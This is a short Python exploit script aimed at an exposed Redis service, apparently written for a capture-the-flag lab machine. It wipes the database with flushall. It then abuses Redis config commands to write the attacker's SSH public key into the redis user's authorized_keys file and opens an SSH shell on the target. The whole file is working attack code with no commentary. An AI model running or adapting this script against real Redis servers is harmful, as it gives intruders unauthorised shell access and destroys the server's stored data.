#!/usr/bin/python3.8

import socket
import os

IP_TARGET = '10.10.10.160'
PORT_TARGET = 6379
USER = 'redis'

def ssh_connection():
    shell = "ssh -i $HOME/.ssh/id_rsa " + USER + '@' + IP_TARGET
    os.system(shell)

class Redis:
    def __init__(self, ip_target, port_target, buffer_size = 1024):
        self.ip_target = ip_target
        self.port_target = port_target
        self.socket = None
        self.buffer_size = buffer_size

    def connect(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.ip_target, self.port_target))

    def close(self):
        self.socket.close()

    def sendCmd(self, cmd):
        self.socket.send(cmd + b'\r\n')
        data = '[ ' + self.socket.recv(self.buffer_size).rstrip().decode() + ' ]'
        print(data)
        return data

# Run the exploit

home_path = os.getenv("HOME")
if os.path.exists(home_path + '/.ssh/id_rsa.pub'):
    rep = input("Do you want to generate a new ssh key? (y or n): ")
    if rep == 'y':
        print("Generating ssh key ...")
        os.system('ssh-keygen -t rsa -C "HackD3v"')
else:
    os.system('ssh-keygen -t rsa')

r = Redis(IP_TARGET, PORT_TARGET)
r.connect()

r.sendCmd(b'flushall')

print("Sending private key to the server ...")
pub_key_file=open(home_path + '/.ssh/id_rsa.pub', 'r').read().rstrip().encode()
r.sendCmd(b'SET keypublic "\\r\\n\\n' + pub_key_file + b'\\r\\n\\n"')

r.sendCmd(b'config set dir "/var/lib/redis/.ssh/"')
r.sendCmd(b'config set dbfilename "authorized_keys"')
r.sendCmd(b'save')

r.close

print("Connexion to ssh.")
ssh_connection()
